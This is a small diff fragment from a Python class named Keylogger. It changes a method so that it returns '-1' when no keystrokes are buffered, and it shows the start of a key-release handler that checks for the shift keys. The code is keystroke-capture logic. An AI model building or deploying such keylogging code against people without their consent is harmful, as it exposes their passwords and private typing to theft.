@@ -39,7 +39,7 @@ class Keylogger(object):
    data = ''.join(self.data)
    print(data)
   self.data = []
-  return data
+  return data if data else '-1'
 
  def on_release(self, key):
   if any([key == Key.shift, key == Key.shift_r]):
